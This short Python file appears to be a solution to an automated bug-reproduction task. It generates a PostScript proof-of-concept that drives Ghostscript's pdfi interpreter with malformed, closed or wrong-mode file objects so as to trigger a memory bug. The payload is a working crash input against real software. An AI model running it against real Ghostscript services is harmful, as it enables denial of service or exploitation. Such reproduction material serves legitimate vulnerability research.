import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Heuristic: this bug description strongly matches Ghostscript pdfi used from PostScript.
        # We don't need source-guided generation; keep PoC small and deterministic.
        ps = r"""%!
systemdict /runlibfile known { (pdf_main.ps) { runlibfile } stopped pop } if

/tryf {
  /f exch def
  { f runpdfbegin } stopped pop
  { f .runpdfbegin } stopped pop
  30 { { pdfpagecount pop } stopped pop } repeat
  10 { { 1 pdfgetpage pop } stopped pop } repeat
  { pdfclose } stopped pop
  { runpdfend } stopped pop
  { .runpdfend } stopped pop
} bind def

/F1 (255044462d312e370a25e2e3cfd30a) /ASCIIHexDecode filter def
F1 tryf

/F2 (%stdin) (r) file def
F2 closefile
F2 tryf

/F3 (%stdout) (w) file def
F3 tryf

quit
"""
        return ps.encode("latin-1", errors="ignore")